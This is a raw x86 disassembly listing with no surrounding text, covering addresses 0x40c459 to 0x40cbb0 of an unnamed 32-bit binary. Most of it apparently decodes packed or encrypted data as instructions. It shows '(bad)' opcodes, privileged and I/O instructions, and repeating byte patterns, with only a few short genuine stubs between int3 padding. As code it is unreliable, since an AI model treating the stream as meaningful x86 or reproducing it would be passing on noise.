  40c459:	iret   
  40c45a:	dec    ecx
  40c45b:	jnp    0x40c4db
  40c45d:	or     eax,0x7d152e89
  40c462:	mov    cl,0xde
  40c464:	aam    0x41
  40c466:	jae    0x40c4a8
  40c468:	bound  ebx,QWORD PTR [eax+0x41]
  40c46b:	add    eax,0x40404340
  40c470:	inc    ebx
  40c471:	inc    eax
  40c472:	test   BYTE PTR [eax],al
  40c474:	add    eax,0x40624041
  40c479:	inc    eax
  40c47a:	add    BYTE PTR [edx+0x5],ah
  40c47d:	inc    ebx
  40c47e:	add    BYTE PTR [eax+0x78],al
  40c481:	inc    ecx
  40c482:	add    BYTE PTR [eax+0x41],bl
  40c485:	bound  ebx,QWORD PTR [eax-0x35]
  40c488:	xor    eax,0x7a2453bb
  40c48d:	arpl   WORD PTR [edx+0x48],sp
  40c490:	jge    0x40c4f1
  40c492:	int3   
  40c493:	jnp    0x40c455
  40c495:	xor    al,0x41
  40c497:	or     eax,0xc451111b
  40c49c:	jp     0x40c4de
  40c49e:	inc    eax
  40c49f:	inc    ebp
  40c4a0:	jge    0x40c4e3
  40c4a2:	addr16 mov ds:0xb8f9,eax
  40c4a6:	inc    ecx
  40c4a7:	inc    ecx
  40c4a8:	add    ecx,edx
  40c4aa:	push   ecx
  40c4ab:	and    ebx,DWORD PTR [ebp+edi*1+0x5a7dc428]
  40c4b2:	arpl   WORD PTR [ebx+0x5],cx
  40c4b5:	ret    
  40c4b6:	dec    esp
  40c4b7:	pop    esp
  40c4b8:	addr16 xchg ebx,eax
  40c4ba:	mov    cl,0x52
  40c4bc:	inc    ecx
  40c4bd:	imul   ebp,DWORD PTR [edx],0x84407de6
  40c4c3:	add    ah,cl
  40c4c5:	bound  eax,QWORD PTR ds:0xcc840f41
  40c4cb:	inc    ebx
  40c4cc:	add    BYTE PTR [eax+0x0],al
  40c4cf:	inc    eax
  40c4d0:	inc    eax
  40c4d1:	inc    eax
  40c4d2:	int3   
  40c4d3:	add    BYTE PTR ds:0x62404341,al
  40c4d9:	pop    eax
  40c4da:	add    BYTE PTR [ebx+0x40],al
  40c4dd:	bound  ecx,QWORD PTR [edi]
  40c4df:	inc    eax
  40c4e0:	dec    esp
  40c4e1:	cmp    dh,BYTE PTR [ebx]
  40c4e3:	fbstp  TBYTE PTR [esp+ecx*8]
  40c4e6:	and    eax,0x9c54914d
  40c4eb:	dec    esp
  40c4ec:	inc    eax
  40c4ed:	adc    eax,0x3b767c41
  40c4f2:	push   esi
  40c4f3:	gs mov esp,0x91b3c445
  40c4f9:	jb     0x40c4be
  40c4fb:	call   0x0:0x7c584449
  40c502:	inc    eax
  40c503:	inc    eax
  40c504:	cmovno eax,DWORD PTR ds:0x40056243
  40c50b:	int3   
  40c50c:	add    ah,cl
  40c50e:	inc    eax
  40c50f:	inc    eax
  40c510:	bound  eax,QWORD PTR [ecx+0x0]
  40c513:	add    BYTE PTR [edi],cl
  40c515:	inc    ebx
  40c516:	inc    eax
  40c517:	inc    eax
  40c518:	add    BYTE PTR [ecx+0x43],al
  40c51b:	add    eax,0x40256240
  40c520:	bound  eax,QWORD PTR [eax]
  40c522:	jp     0x40c595
  40c524:	inc    esp
  40c525:	adc    eax,0x9911e456
  40c52a:	aad    0x3d
  40c52c:	fwait
  40c52d:	out    dx,eax
  40c52e:	enter  0xcd52,0x7c
  40c532:	dec    edx
  40c533:	inc    ecx
  40c534:	push   si
  40c536:	inc    ecx
  40c537:	aam    0xb3
  40c539:	call   edi
  40c53b:	pop    eax
  40c53c:	push   ebp
  40c53d:	or     BYTE PTR gs:0x395a7c28,0xdd
  40c545:	cwde   
  40c546:	ret    
  40c547:	leave  
  40c548:	push   eax
  40c549:	in     eax,0xd5
  40c54b:	pusha  
  40c54c:	xchg   edx,eax
  40c54d:	outs   dx,DWORD PTR ds:[esi]
  40c54e:	mov    esp,0xbf7cf0d0
  40c553:	mov    cl,0x37
  40c555:	add    eax,0x4140cc00
  40c55a:	inc    eax
  40c55b:	inc    ebx
  40c55c:	bound  esp,QWORD PTR ds:0x41400043
  40c562:	add    BYTE PTR [eax],al
  40c564:	add    eax,0x43624062
  40c569:	inc    ecx
  40c56a:	inc    eax
  40c56b:	inc    eax
  40c56c:	inc    eax
  40c56d:	add    eax,0x40624340
  40c572:	add    eax,0x40664140
  40c577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c578:	add    eax,0x40cb2505
  40c57d:	inc    ebx
  40c57e:	out    dx,eax
  40c57f:	xchg   esi,eax
  40c580:	retf   
  40c581:	leave  
  40c582:	int    0x7c
  40c584:	mov    ch,0x13
  40c586:	stos   BYTE PTR es:[edi],al
  40c587:	imul   ecx,DWORD PTR [edx],0x44
  40c58a:	cld    
  40c58b:	xor    DWORD PTR [edx+0x42],edx
  40c58e:	xchg   ebp,eax
  40c58f:	mov    ecx,0x7c7d0a44
  40c594:	jno    0x40c60d
  40c596:	pop    es
  40c597:	xchg   esp,eax
  40c598:	leave  
  40c599:	retf   
  40c59a:	les    edx,FWORD PTR [edi]
  40c59c:	outs   dx,BYTE PTR ds:[esi]
  40c59d:	jae    0x40c618
  40c59f:	in     al,dx
  40c5a0:	es inc edx
  40c5a2:	fistp  QWORD PTR [ecx+esi*8-0xe]
  40c5a6:	xor    al,0x15
  40c5a8:	inc    edi
  40c5a9:	inc    ebx
  40c5aa:	add    BYTE PTR ds:0x41107840,al
  40c5b0:	bound  eax,QWORD PTR [eax+0x40]
  40c5b3:	sldt   WORD PTR [eax-0x34]
  40c5b7:	js     0x40c61b
  40c5b9:	add    eax,0x40664143
  40c5be:	inc    ebx
  40c5bf:	add    BYTE PTR [ecx+0x5],al
  40c5c2:	js     0x40c604
  40c5c4:	bound  eax,QWORD PTR [eax+0x0]
  40c5c7:	inc    eax
  40c5c8:	retf   
  40c5c9:	stos   DWORD PTR es:[edi],eax
  40c5ca:	jge    0x40c621
  40c5cc:	jl     0x40c5bf
  40c5ce:	pop    bp
  40c5d0:	dec    esp
  40c5d1:	or     edi,DWORD PTR [ebp+ebx*1+0x6d]
  40c5d5:	xchg   edx,eax
  40c5d6:	inc    eax
  40c5d7:	in     al,0x49
  40c5d9:	repnz arpl WORD PTR [edx],cx
  40c5dc:	adc    al,0xda
  40c5de:	inc    eax
  40c5df:	jo     0x40c569
  40c5e1:	repz jl 0x40c65d
  40c5e4:	std    
  40c5e5:	inc    ebx
  40c5e6:	inc    eax
  40c5e7:	adc    BYTE PTR [eax+ebp*4],0x41
  40c5eb:	inc    ebx
  40c5ec:	inc    eax
  40c5ed:	inc    eax
  40c5ee:	add    eax,0x434162
  40c5f3:	inc    eax
  40c5f4:	add    BYTE PTR [edx+0x5],ah
  40c5f7:	inc    eax
  40c5f8:	adc    BYTE PTR [edx+0x40],ah
  40c5fb:	inc    ebx
  40c5fc:	inc    ecx
  40c5fd:	add    eax,0x4340
  40c602:	add    eax,0x404162
  40c607:	add    BYTE PTR [eax+0x43],al
  40c60a:	inc    eax
  40c60b:	add    eax,0xf6174c49
  40c610:	dec    eax
  40c611:	inc    esp
  40c612:	bound  edx,QWORD PTR [edx]
  40c614:	jnp    0x40c68b
  40c616:	xchg   ebx,eax
  40c617:	mov    ds:0xac6c2641,al
  40c61c:	scas   eax,DWORD PTR es:[edi]
  40c61d:	xor    al,bh
  40c61f:	dec    esp
  40c620:	in     eax,dx
  40c621:	call   0x1fbbdbc8
  40c626:	add    ebx,edx
  40c628:	call   0x960bfbed
  40c62d:	xor    BYTE PTR [ecx-0x1],al
  40c630:	arpl   WORD PTR [ecx+edx*8+0x4e],ax
  40c634:	jnp    0x40c655
  40c636:	push   eax
  40c637:	repz imul eax,esi,0xffffffa6
  40c63b:	stos   DWORD PTR es:[edi],eax
  40c63c:	inc    eax
  40c63d:	add    BYTE PTR [eax],al
  40c63f:	inc    ecx
  40c640:	inc    ebx
  40c641:	add    eax,0x41784062
  40c646:	inc    eax
  40c647:	inc    eax
  40c648:	add    BYTE PTR [edi],cl
  40c64a:	bound  eax,QWORD PTR [ebx+0x0]
  40c64d:	add    eax,0x25006240
  40c652:	inc    eax
  40c653:	add    eax,0x40254143
  40c658:	add    eax,0xfb620000
  40c65d:	mov    edi,0x3d04f625
  40c662:	test   al,0x42
  40c664:	jnp    0x40c626
  40c666:	inc    ebx
  40c667:	lods   eax,DWORD PTR ds:[esi]
  40c668:	bound  ebp,QWORD PTR [eax+0x1fe13410]
  40c66e:	xor    eax,edi
  40c670:	push   ds
  40c671:	mov    esp,0xc07b40bf
  40c676:	dec    ecx
  40c677:	ret    
  40c678:	test   eax,0xc448bf15
  40c67d:	pop    ds
  40c67e:	shl    BYTE PTR [eax-0x58],cl
  40c681:	leave  
  40c682:	mov    edi,0x7c7d7bc5
  40c687:	or     BYTE PTR [ecx],0x43
  40c68a:	add    BYTE PTR [eax],al
  40c68c:	add    BYTE PTR [ecx+0x40],al
  40c68f:	bound  esp,QWORD PTR [esi+0x0]
  40c692:	inc    eax
  40c693:	add    eax,0x5400000
  40c698:	inc    ecx
  40c699:	inc    eax
  40c69a:	inc    eax
  40c69b:	bound  esp,QWORD PTR ds:0x25050043
  40c6a1:	inc    ecx
  40c6a2:	inc    ebx
  40c6a3:	inc    eax
  40c6a4:	test   BYTE PTR [eax+0x0],al
  40c6a7:	bound  ebx,QWORD PTR [eax+0x62]
  40c6aa:	inc    ecx
  40c6ab:	inc    eax
  40c6ac:	inc    ecx
  40c6ad:	and    al,0x90
  40c6af:	cmp    ebx,DWORD PTR [edi]
  40c6b1:	push   ss
  40c6b2:	cli    
  40c6b3:	das    
  40c6b4:	add    ch,0xf9
  40c6b7:	jnp    0x40c736
  40c6b9:	dec    esp
  40c6ba:	sub    al,0x68
  40c6bc:	ret    
  40c6bd:	int    0xdc
  40c6bf:	and    DWORD PTR [edi],ebx
  40c6c1:	xor    ch,ch
  40c6c3:	retf   
  40c6c4:	mov    esp,0xc07bea40
  40c6c9:	jle    0x40c6c2
  40c6cb:	dec    ecx
  40c6cc:	adc    eax,0x1f08a82a
  40c6d1:	outs   dx,DWORD PTR ds:[esi]
  40c6d2:	std    
  40c6d3:	(bad)  
  40c6d4:	retf   
  40c6d5:	dec    ecx
  40c6d6:	adc    DWORD PTR [ebx+0x56],edi
  40c6d9:	push   esi
  40c6da:	sbb    al,0xde
  40c6dc:	add    eax,ebx
  40c6de:	dec    eax
  40c6df:	fs mov ebp,0x4062107c
  40c6e5:	inc    ecx
  40c6e6:	and    eax,0x40000500
  40c6eb:	inc    ebx
  40c6ec:	add    eax,0x40624041
  40c6f1:	inc    ebx
  40c6f2:	add    eax,0x43402541
  40c6f7:	bound  eax,QWORD PTR [eax+0x43]
  40c6fa:	int3   
  40c6fb:	inc    eax
  40c6fc:	bound  eax,QWORD PTR [eax]
  40c6fe:	inc    ecx
  40c6ff:	inc    eax
  40c700:	inc    eax
  40c701:	add    eax,0x544c7b05
  40c706:	mov    eax,0xbe2f7a41
  40c70b:	outs   dx,BYTE PTR ds:[esi]
  40c70c:	add    eax,0xa90462c9
  40c711:	pop    ds
  40c712:	mov    edi,0x2826cbf4
  40c717:	in     al,dx
  40c718:	jp     0x40c762
  40c71a:	inc    eax
  40c71b:	dec    ebp
  40c71c:	es dec esp
  40c71e:	jnp    0x40c762
  40c720:	hlt    
  40c721:	push   esp
  40c722:	bound  eax,QWORD PTR [eax+0x25]
  40c725:	add    BYTE PTR [esi+0x40],ah
  40c728:	add    eax,0x40404143
  40c72d:	inc    ebx
  40c72e:	add    BYTE PTR [eax],al
  40c730:	add    BYTE PTR [edx-0x34],ah
  40c733:	inc    eax
  40c734:	add    eax,0x40004041
  40c739:	inc    ecx
  40c73a:	int3   
  40c73b:	add    BYTE PTR [ebx-0x7c],al
  40c73e:	add    eax,0x5406240
  40c743:	bound  eax,QWORD PTR [eax-0x3f]
  40c746:	retf   
  40c747:	dec    ebp
  40c748:	and    eax,0xe0bf40c9
  40c74d:	sbb    DWORD PTR [ebp-0xc],esp
  40c750:	bound  ecx,QWORD PTR [eax+0x40]
  40c753:	ss pop esi
  40c755:	repz jbe 0x40c7c8
  40c758:	mov    eax,0xbe624015
  40c75d:	jge    0x40c723
  40c75f:	and    BYTE PTR [edi-0x35],0x2c
  40c763:	jno    0x40c733
  40c765:	push   edi
  40c766:	mov    eax,0x4042fd5a
  40c76b:	inc    ecx
  40c76c:	fadd   DWORD PTR [eax+0x62]
  40c76f:	pop    eax
  40c770:	inc    ecx
  40c771:	add    eax,0x40404340
  40c776:	inc    ebx
  40c777:	inc    eax
  40c778:	test   BYTE PTR [eax],al
  40c77a:	add    eax,0x40624041
  40c77f:	inc    eax
  40c780:	add    BYTE PTR [edx+0x5],ah
  40c783:	inc    ebx
  40c784:	add    BYTE PTR [eax+0x78],al
  40c787:	inc    ecx
  40c788:	add    BYTE PTR [eax+0x41],bl
  40c78b:	bound  eax,QWORD PTR [edi+0x5abc32ec]
  40c791:	inc    eax
  40c792:	xchg   edi,eax
  40c793:	xor    eax,0x16e46597
  40c798:	fcom   DWORD PTR [eax+0x4d]
  40c79b:	(bad)  
  40c79f:	int    0x25
  40c7a1:	inc    eax
  40c7a2:	push   ecx
  40c7a3:	inc    eax
  40c7a4:	hlt    
  40c7a5:	add    bh,dh
  40c7a7:	fcomp  QWORD PTR [edi]
  40c7a9:	inc    eax
  40c7aa:	and    al,0x65
  40c7ac:	lock bound ecx,QWORD PTR [edi-0x66]
  40c7b0:	inc    eax
  40c7b1:	test   BYTE PTR [eax],al
  40c7b3:	int3   
  40c7b4:	bound  eax,QWORD PTR ds:0xcc840f41
  40c7ba:	inc    ebx
  40c7bb:	add    BYTE PTR [eax+0x0],al
  40c7be:	inc    eax
  40c7bf:	inc    eax
  40c7c0:	inc    eax
  40c7c1:	int3   
  40c7c2:	add    BYTE PTR ds:0x62404341,al
  40c7c8:	pop    eax
  40c7c9:	add    BYTE PTR [ebx+0x40],al
  40c7cc:	bound  ecx,QWORD PTR [edi]
  40c7ce:	inc    eax
  40c7cf:	test   al,0x40
  40c7d1:	pop    edi
  40c7d2:	inc    eax
  40c7d3:	nop
  40c7d4:	sar    DWORD PTR [edi+0x444011c1],1
  40c7da:	dec    ebx
  40c7db:	fdivr  DWORD PTR [edi+edi*4+0x53]
  40c7df:	lods   al,BYTE PTR ds:[esi]
  40c7e0:	inc    eax
  40c7e1:	not    eax
  40c7e3:	bound  esp,QWORD PTR [ebx-0x49]
  40c7e6:	into   
  40c7e7:	or     eax,0x69046040
  40c7ec:	push   ss
  40c7ed:	fist   WORD PTR [eax+0x425340cb]
  40c7f3:	cdq    
  40c7f4:	fsubr  QWORD PTR [eax+0x3c404466]
  40c7fa:	xor    BYTE PTR [ecx+0x40400000],cl
  40c800:	cmovno eax,DWORD PTR ds:0x40056243
  40c807:	int3   
  40c808:	add    ah,cl
  40c80a:	inc    eax
  40c80b:	inc    eax
  40c80c:	bound  eax,QWORD PTR [ecx+0x0]
  40c80f:	add    BYTE PTR [edi],cl
  40c811:	inc    ebx
  40c812:	inc    eax
  40c813:	inc    eax
  40c814:	add    BYTE PTR [ecx+0x43],al
  40c817:	add    eax,0x40256240
  40c81c:	bound  eax,QWORD PTR [eax]
  40c81e:	fs add al,0x4e
  40c821:	add    al,BYTE PTR [eax+0x20]
  40c824:	add    ebx,eax
  40c826:	mov    esp,0x40c9d847
  40c82b:	sbb    DWORD PTR [ebx+0x1e],ecx
  40c82e:	inc    eax
  40c82f:	outs   dx,BYTE PTR ds:[esi]
  40c830:	and    eax,0xb52040ac
  40c835:	sahf   
  40c836:	shl    DWORD PTR [eax],1
  40c838:	je     0x40c882
  40c83a:	inc    eax
  40c83b:	pop    ds
  40c83c:	sub    DWORD PTR [ecx+0x49626569],edi
  40c842:	inc    eax
  40c843:	inc    eax
  40c844:	adc    DWORD PTR [esi+0x4f],ecx
  40c847:	xor    BYTE PTR [eax-0x38],dl
  40c84a:	inc    eax
  40c84b:	xchg   ecx,eax
  40c84c:	pop    ecx
  40c84d:	mov    gs,WORD PTR [eax+0x400343d9]
  40c853:	and    ecx,esi
  40c855:	and    DWORD PTR [ebx+ebp*8-0x33fffacb],esi
  40c85c:	inc    eax
  40c85d:	inc    ecx
  40c85e:	inc    eax
  40c85f:	inc    ebx
  40c860:	bound  esp,QWORD PTR ds:0x41400043
  40c866:	add    BYTE PTR [eax],al
  40c868:	add    eax,0x43624062
  40c86d:	inc    ecx
  40c86e:	inc    eax
  40c86f:	inc    eax
  40c870:	inc    eax
  40c871:	add    eax,0x40624340
  40c876:	add    eax,0x40664140
  40c87b:	add    DWORD PTR [eax+0x37],eax
  40c87e:	pop    esi
  40c87f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c880:	mov    ds:0x40c56359,al
  40c885:	and    eax,0xf262dfb1
  40c88a:	test   al,0xac
  40c88c:	inc    eax
  40c88d:	jae    0x40c87e
  40c88f:	stc    
  40c890:	(bad)  
  40c891:	dec    edx
  40c892:	adc    DWORD PTR [ebx+0x430d2140],ebx
  40c898:	add    BYTE PTR ds:0x41107840,al
  40c89e:	bound  eax,QWORD PTR [eax+0x40]
  40c8a1:	sldt   WORD PTR [eax-0x34]
  40c8a5:	js     0x40c909
  40c8a7:	add    eax,0x40664143
  40c8ac:	inc    ebx
  40c8ad:	add    BYTE PTR [ecx+0x5],al
  40c8b0:	js     0x40c8f2
  40c8b2:	bound  eax,QWORD PTR [eax+0x0]
  40c8b5:	inc    eax
  40c8b6:	es dec eax
  40c8b8:	push   edx
  40c8b9:	mov    esp,0xf4b340e1
  40c8be:	xchg   esp,eax
  40c8bf:	arpl   WORD PTR [ecx+eax*2],ax
  40c8c2:	bound  eax,QWORD PTR [eax+0x48]
  40c8c5:	imul   ecx,DWORD PTR [ecx+0x54],0x40fc20cd
  40c8cc:	xchg   ecx,eax
  40c8cd:	inc    ecx
  40c8ce:	pusha  
  40c8cf:	or     eax,0x402c68bc
  40c8d4:	pop    edi
  40c8d5:	lock das 
  40c8d7:	retf   
  40c8d8:	adc    eax,0x15406262
  40c8dd:	lds    edx,FWORD PTR [bx+0x41]
  40c8e1:	inc    ebx
  40c8e2:	inc    eax
  40c8e3:	inc    eax
  40c8e4:	add    eax,0x434162
  40c8e9:	inc    eax
  40c8ea:	add    BYTE PTR [edx+0x5],ah
  40c8ed:	inc    eax
  40c8ee:	adc    BYTE PTR [edx+0x40],ah
  40c8f1:	inc    ebx
  40c8f2:	inc    ecx
  40c8f3:	add    eax,0x4340
  40c8f8:	add    eax,0x404162
  40c8fd:	add    BYTE PTR [eax+0x43],al
  40c900:	inc    eax
  40c901:	add    eax,0x407d3fcb
  40c906:	mov    edi,0x1cabf340
  40c90b:	call   0x611009b8
  40c910:	pop    ss
  40c911:	inc    edx
  40c912:	xor    al,0x63
  40c914:	adc    DWORD PTR [eax+0x31],eax
  40c917:	dec    eax
  40c918:	sub    BYTE PTR [eax+eax*2],cl
  40c91b:	pop    eax
  40c91c:	dec    ebp
  40c91d:	inc    eax
  40c91e:	inc    ecx
  40c91f:	xor    esi,ebp
  40c921:	cld    
  40c922:	inc    eax
  40c923:	add    BYTE PTR [eax],al
  40c925:	inc    ecx
  40c926:	inc    ebx
  40c927:	add    eax,0x41784062
  40c92c:	inc    eax
  40c92d:	inc    eax
  40c92e:	add    BYTE PTR [edi],cl
  40c930:	bound  eax,QWORD PTR [ebx+0x0]
  40c933:	add    eax,0x25006240
  40c938:	inc    eax
  40c939:	add    eax,0x40254143
  40c93e:	add    eax,0xbc620000
  40c943:	adc    eax,0x61554087
  40c948:	lds    edi,FWORD PTR gs:0x42407360
  40c94f:	mov    bl,0x89
  40c951:	dec    edx
  40c952:	ret    
  40c953:	ss inc eax
  40c955:	inc    eax
  40c956:	repnz jecxz 0x40c9a5
  40c959:	int    0x4a
  40c95b:	(bad)  
  40c95c:	xlat   BYTE PTR ds:[ebx]
  40c95d:	inc    eax
  40c95e:	cs inc edx
  40c960:	pusha  
  40c961:	inc    eax
  40c962:	inc    ecx
  40c963:	pop    eax
  40c964:	rol    DWORD PTR [eax+0x65],1
  40c967:	icebp  
  40c968:	(bad)  
  40c969:	xor    ah,ch
  40c96b:	pusha  
  40c96c:	bound  eax,QWORD PTR [eax-0x2f]
  40c96f:	push   ebp
  40c970:	inc    ebx
  40c971:	add    BYTE PTR [eax],al
  40c973:	add    BYTE PTR [ecx+0x40],al
  40c976:	bound  esp,QWORD PTR [esi+0x0]
  40c979:	inc    eax
  40c97a:	add    eax,0x5400000
  40c97f:	inc    ecx
  40c980:	inc    eax
  40c981:	inc    eax
  40c982:	bound  esp,QWORD PTR ds:0x25050043
  40c988:	inc    ecx
  40c989:	inc    ebx
  40c98a:	inc    eax
  40c98b:	test   BYTE PTR [eax+0x0],al
  40c98e:	bound  ebx,QWORD PTR [eax+0x62]
  40c991:	inc    ecx
  40c992:	inc    eax
  40c993:	(bad)  
  40c994:	addr16 push ebp
  40c996:	inc    ecx
  40c997:	addr16 inc eax
  40c999:	pop    ebp
  40c99a:	sbb    eax,0x62a8744b
  40c99f:	cmp    al,0x40
  40c9a1:	icebp  
  40c9a2:	out    0x50,al
  40c9a4:	test   al,0x11
  40c9a6:	xor    al,0x63
  40c9a8:	inc    eax
  40c9a9:	outs   dx,BYTE PTR ds:[esi]
  40c9aa:	push   ss
  40c9ab:	push   eax
  40c9ac:	adc    dl,BYTE PTR [eax+ecx*1+0x2f734010]
  40c9b3:	addr16 mov al,0xd
  40c9b6:	dec    esp
  40c9b7:	dec    eax
  40c9b8:	inc    eax
  40c9b9:	ds ss inc edx
  40c9bc:	inc    ecx
  40c9bd:	inc    edx
  40c9be:	add    al,BYTE PTR ss:[eax+0x33]
  40c9c2:	cmp    al,0x1
  40c9c4:	inc    eax
  40c9c5:	inc    ecx
  40c9c6:	add    DWORD PTR [eax],edx
  40c9c8:	bound  eax,QWORD PTR [eax+0x41]
  40c9cb:	and    eax,0x40000500
  40c9d0:	inc    ebx
  40c9d1:	add    eax,0x40624041
  40c9d6:	inc    ebx
  40c9d7:	add    eax,0x43402541
  40c9dc:	bound  eax,QWORD PTR [eax+0x43]
  40c9df:	int3   
  40c9e0:	inc    eax
  40c9e1:	bound  eax,QWORD PTR [eax]
  40c9e3:	inc    ecx
  40c9e4:	inc    eax
  40c9e5:	inc    eax
  40c9e6:	add    eax,0xaf408705
  40c9eb:	push   0xa88c30ea
  40c9f0:	inc    ecx
  40c9f1:	inc    eax
  40c9f2:	inc    ecx
  40c9f3:	inc    ebx
  40c9f4:	adc    BYTE PTR [eax+0x61],ch
  40c9f7:	adc    ch,bl
  40c9f9:	inc    eax
  40c9fa:	xchg   ecx,eax
  40c9fb:	xchg   ecx,eax
  40c9fc:	inc    ebp
  40c9fd:	push   edi
  40c9fe:	test   al,0xbc
  40ca00:	sub    al,0x40
  40ca02:	pop    ecx
  40ca03:	add    esi,DWORD PTR [ecx]
  40ca05:	xor    eax,0x40354110
  40ca0a:	jno    0x40c9fd
  40ca0c:	jl     0x40ca3a
  40ca0e:	pushf  
  40ca0f:	jge    0x40c995
  40ca11:	inc    eax
  40ca12:	push   ds
  40ca13:	stos   DWORD PTR es:[edi],eax
  40ca14:	popf   
  40ca15:	mov    dh,0x5
  40ca17:	cmp    al,0x62
  40ca19:	inc    eax
  40ca1a:	shl    DWORD PTR [edx+0x40],1
  40ca1d:	and    eax,0x5406600
  40ca22:	inc    ebx
  40ca23:	inc    ecx
  40ca24:	inc    eax
  40ca25:	inc    eax
  40ca26:	inc    ebx
  40ca27:	add    BYTE PTR [eax],al
  40ca29:	add    BYTE PTR [edx-0x34],ah
  40ca2c:	inc    eax
  40ca2d:	add    eax,0x40004041
  40ca32:	inc    ecx
  40ca33:	int3   
  40ca34:	add    BYTE PTR [ebx-0x7c],al
  40ca37:	add    eax,0x5406240
  40ca3c:	bound  esp,QWORD PTR [edi+0x4d]
  40ca3f:	popa   
  40ca40:	retf   
  40ca41:	push   eax
  40ca42:	cmp    eax,0x3c505d40
  40ca47:	pusha  
  40ca48:	inc    esp
  40ca49:	pop    es
  40ca4a:	enter  0x5540,0x35
  40ca4e:	mov    DWORD PTR [ebx+0x44],esp
  40ca51:	adc    DWORD PTR [eax+0x40],esp
  40ca54:	bound  esi,QWORD PTR [ebp-0x16]
  40ca57:	adc    DWORD PTR [ebx+0x63],edx
  40ca5a:	add    al,BYTE PTR [eax+0x72]
  40ca5d:	inc    eax
  40ca5e:	bound  ebx,QWORD PTR [eax+0x41]
  40ca61:	add    eax,0x40404340
  40ca66:	inc    ebx
  40ca67:	inc    eax
  40ca68:	test   BYTE PTR [eax],al
  40ca6a:	add    eax,0x40624041
  40ca6f:	inc    eax
  40ca70:	add    BYTE PTR [edx+0x5],ah
  40ca73:	inc    ebx
  40ca74:	add    BYTE PTR [eax+0x78],al
  40ca77:	inc    ecx
  40ca78:	add    BYTE PTR [eax+0x41],bl
  40ca7b:	bound  edx,QWORD PTR [ecx+0x7ac8a84a]
  40ca81:	leave  
  40ca82:	int3   
  40ca83:	int3   
  40ca84:	int3   
  40ca85:	int3   
  40ca86:	int3   
  40ca87:	int3   
  40ca88:	int3   
  40ca89:	int3   
  40ca8a:	int3   
  40ca8b:	int3   
  40ca8c:	int3   
  40ca8d:	int3   
  40ca8e:	int3   
  40ca8f:	int3   
  40ca90:	mov    al,BYTE PTR [edi]
  40ca92:	mov    cl,BYTE PTR [esi]
  40ca94:	ret    
  40ca95:	int3   
  40ca96:	int3   
  40ca97:	int3   
  40ca98:	int3   
  40ca99:	int3   
  40ca9a:	int3   
  40ca9b:	int3   
  40ca9c:	int3   
  40ca9d:	int3   
  40ca9e:	int3   
  40ca9f:	int3   
  40caa0:	push   esi
  40caa1:	push   ecx
  40caa2:	mov    esi,edi
  40caa4:	mov    BYTE PTR [esi],al
  40caa6:	pop    ecx
  40caa7:	pop    esi
  40caa8:	inc    esi
  40caa9:	ret    
  40caaa:	int3   
  40caab:	int3   
  40caac:	int3   
  40caad:	int3   
  40caae:	int3   
  40caaf:	int3   
  40cab0:	inc    eax
  40cab1:	add    eax,0x40624340
  40cab6:	add    eax,0x40664140
  40cabb:	adc    eax,0xfe758d2a
  40cac0:	mov    edi,0x7b44334a
  40cac5:	mov    esp,0x7b63f010
  40caca:	dec    esi
  40cacb:	enter  0x6845,0x62
  40cacf:	cmc    
  40cad0:	inc    ebx
  40cad1:	add    BYTE PTR ds:0x41107840,al
  40cad7:	bound  eax,QWORD PTR [eax+0x40]
  40cada:	sldt   WORD PTR [eax-0x34]
  40cade:	js     0x40cb42
  40cae0:	add    eax,0x40664143
  40cae5:	inc    ebx
  40cae6:	add    BYTE PTR [ecx+0x5],al
  40cae9:	js     0x40cb2b
  40caeb:	bound  eax,QWORD PTR [eax+0x0]
  40caee:	inc    eax
  40caef:	imul   esi,DWORD PTR [ebp+0x3f],0xffffffa0
  40caf3:	adc    eax,0x71ebf865
  40caf8:	inc    ecx
  40caf9:	dec    esi
  40cafa:	ss fs (bad) 
  40cafe:	mov    bl,0x32
  40cb00:	aaa    
  40cb01:	sar    esp,cl
  40cb03:	arpl   WORD PTR [esi-0x58],sp
  40cb06:	jp     0x40ca9c
  40cb08:	retf   0x412f
  40cb0b:	add    al,0x20
  40cb0d:	adc    BYTE PTR [ebx-0x40],al
  40cb10:	adc    al,0x4e
  40cb12:	mov    eax,?
  40cb14:	and    al,0xac
  40cb16:	xor    esi,ebx
  40cb18:	push   0xb06a52df
  40cb1d:	inc    edx
  40cb1e:	push   esp
  40cb1f:	bound  edx,QWORD PTR [ebp+0x4e]
  40cb22:	test   al,0x41
  40cb24:	inc    ebx
  40cb25:	inc    eax
  40cb26:	inc    eax
  40cb27:	add    eax,0x434162
  40cb2c:	inc    eax
  40cb2d:	add    BYTE PTR [edx+0x5],ah
  40cb30:	inc    eax
  40cb31:	adc    BYTE PTR [edx+0x40],ah
  40cb34:	inc    ebx
  40cb35:	inc    ecx
  40cb36:	add    eax,0x4340
  40cb3b:	add    eax,0x404162
  40cb40:	add    BYTE PTR [eax+0x43],al
  40cb43:	inc    eax
  40cb44:	add    eax,0x40674341
  40cb49:	or     al,0x53
  40cb4b:	fistp  QWORD PTR [edx-0x4]
  40cb4e:	push   eax
  40cb4f:	and    al,0x31
  40cb51:	xchg   ebx,eax
  40cb52:	push   ebp
  40cb53:	je     0x40cb7f
  40cb55:	imul   edi,DWORD PTR [edi+0x5fe86c62],0xffffffd7
  40cb5c:	dec    ebp
  40cb5d:	rol    DWORD PTR [eax-0x5c],0x40
  40cb61:	add    BYTE PTR [eax],al
  40cb63:	inc    ecx
  40cb64:	inc    ebx
  40cb65:	add    eax,0x41784062
  40cb6a:	inc    eax
  40cb6b:	inc    eax
  40cb6c:	add    BYTE PTR [edi],cl
  40cb6e:	bound  eax,QWORD PTR [ebx+0x0]
  40cb71:	add    eax,0x25006240
  40cb76:	inc    eax
  40cb77:	add    eax,0x40254143
  40cb7c:	add    eax,0x9b620000
  40cb81:	and    bl,BYTE PTR [esi]
  40cb83:	dec    edi
  40cb84:	clc    
  40cb85:	fadd   QWORD PTR [edx-0x64]
  40cb88:	repz push 0x405eff79
  40cb8e:	and    ah,BYTE PTR [edx-0xf]
  40cb91:	int3   
  40cb92:	addr16 pop eax
  40cb94:	test   al,0x54
  40cb96:	shl    DWORD PTR [eax-0xcae04b1],cl
  40cb9c:	adc    DWORD PTR [edi-0x58],esp
  40cb9f:	inc    eax
  40cba0:	sub    bh,BYTE PTR [edi+0x5a]
  40cba3:	pop    ecx
  40cba4:	mov    esp,0x2e401234
  40cba9:	mov    bh,0x37
  40cbab:	jno    0x40cbee
  40cbad:	clc    
  40cbae:	dec    eax
  40cbaf:	inc    eax
  40cbb0:	inc    ebx
